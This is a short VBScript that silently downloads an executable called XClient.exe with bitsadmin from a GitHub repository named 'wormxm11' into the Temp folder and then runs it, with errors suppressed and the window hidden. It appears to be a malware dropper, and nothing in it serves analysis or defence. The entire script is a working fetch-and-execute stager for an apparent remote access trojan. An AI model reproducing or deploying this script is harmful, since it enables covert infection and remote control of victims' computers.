on error resume next
dim file
file = "%Temp%" + "\XClient.exe"
CreateObject("WScript.Shell").Run "bitsadmin.exe /transfer 8 https://github.com/DIOGOGABRIE/wormxm11/blob/main/XClient.exe " + file,0, true
CreateObject("WScript.Shell").Run file
